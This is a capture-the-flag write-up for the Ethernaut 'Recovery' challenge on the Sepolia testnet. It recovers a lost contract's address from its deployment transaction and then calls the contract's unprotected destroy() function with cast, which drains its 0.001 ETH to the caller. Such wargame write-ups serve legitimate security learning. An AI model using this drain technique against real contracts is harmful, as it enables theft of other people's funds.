# Ethernaut Challenge 17 — Recovery

This challenge demonstrates how contract addresses can be deterministically derived and why losing track of deployed contracts does not mean they are unrecoverable.

The goal is to recover (or remove) the `0.001 ETH` stored in a lost contract.

Instance address:

```bash
0x748eB39299eB709498ebB87a996bd9432F2E2D11
````

---

## 🎯 Goal

Recover the `0.001 ETH` stored in the lost `SimpleToken` contract.

---

## 🧠 Understanding the challenge

The `Recovery` contract creates new `SimpleToken` contracts using:

```solidity
new SimpleToken(_name, msg.sender, _initialSupply);
```

However, it does **not store their addresses**.

At first glance, this seems to make the deployed token contract “lost”.

👉 But contract addresses are deterministic.

When a contract creates another contract, the new address depends on:

* the creator address
* the creator nonce

This means we can **reconstruct the deployed contract address**.

---

## 🔍 Finding the lost contract

By inspecting the deployment transaction on Etherscan:

[https://sepolia.etherscan.io/tx/0x45f310bb5fcb93c32b54647105e50734dfc058fdf9c9565ac66c030649d61d68](https://sepolia.etherscan.io/tx/0x45f310bb5fcb93c32b54647105e50734dfc058fdf9c9565ac66c030649d61d68)

We can see that two contracts were created:

* `Recovery` → `0x748eB39299eB709498ebB87a996bd9432F2E2D11`
* `SimpleToken` → `0x00e986486aac920d93fbd26f7644af16cdccc6dd`

So the lost contract is:

```bash
SIMPLE_TOKEN=0x00e986486aac920d93fbd26f7644af16cdccc6dd
```

---

## 🔎 Verify the contract

Check the token name:

```bash
cast call $SIMPLE_TOKEN \
    "name()" \
    --rpc-url $SEPOLIA_RPC_URL
```

Decode:

```bash
cast --to-utf8 <output>
```

Result:

```bash
InitialToken
```

---

## 💰 Inspect balances

Check the ETH balance of the contract:

```bash
cast balance $SIMPLE_TOKEN \
    --rpc-url $SEPOLIA_RPC_URL \
    --ether
```

Result:

```bash
0.001000000000000000
```

The creator sent `0.001 ETH` to the contract.

---

### Why does the token balance look higher?

The contract has a `receive()` function:

```solidity
receive() external payable {
    balances[msg.sender] = msg.value * 10;
}
```

So when `0.001 ETH` is sent:

```bash
0.001 ETH → 0.01 tokens
```

Check it:

```bash
cast call $SIMPLE_TOKEN \
    "balances(address)" 0xAF98ab8F2e2B24F42C661ed023237f5B7acAB048 \
    --rpc-url $SEPOLIA_RPC_URL
```

Convert:

```bash
cast --to-dec <output>
```

Result:

```bash
10000000000000000
```

---

## 💥 Exploit

The `SimpleToken` contract includes this function:

```solidity
function destroy(address payable _to) public {
    selfdestruct(_to);
}
```

👉 Anyone can call it.

👉 It sends all ETH in the contract to the specified address.

---

## 🚀 Execute on Sepolia

Call `destroy()` and send the ETH to your address:

```bash
cast send $SIMPLE_TOKEN \
    "destroy(address)" 0xeCF94300dD67bB8c31F41BE3a2136D3f0abFb0B0 \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```bash
0xddc9759ba1e950610157c7c985a0d5c9b74aba927c2668e533cbeadf7cdc0176
```

---

## ✅ Verify the result

Check the contract balance again:

```bash
cast balance $SIMPLE_TOKEN \
    --rpc-url $SEPOLIA_RPC_URL \
    --ether
```

Result:

```bash
0.000000000000000000
```

The ETH has been recovered.

Challenge solved ✅




